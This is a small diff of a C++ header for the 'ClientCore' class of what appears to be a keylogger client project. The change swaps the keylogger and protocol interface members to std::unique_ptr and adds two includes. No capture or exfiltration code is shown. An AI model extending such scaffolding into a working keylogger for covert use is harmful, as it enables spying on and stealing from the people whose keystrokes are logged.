@@ -12,14 +12,16 @@
 
 #include "KeyLogger/IKeyLogger.hpp"
 #include "Protocol/IProtocol.hpp"
+#include	<iostream>
+#include	<memory>
 
 namespace spider
 {
   class ClientCore
   {
   protected:
-    IKeyLogger	_keylogger;
-    IProtocol	_proto;
+    std::unique_ptr<IKeyLogger>	_keylogger;
+    std::unique_ptr<IProtocol>	_proto;
 
   public:
     ClientCore();
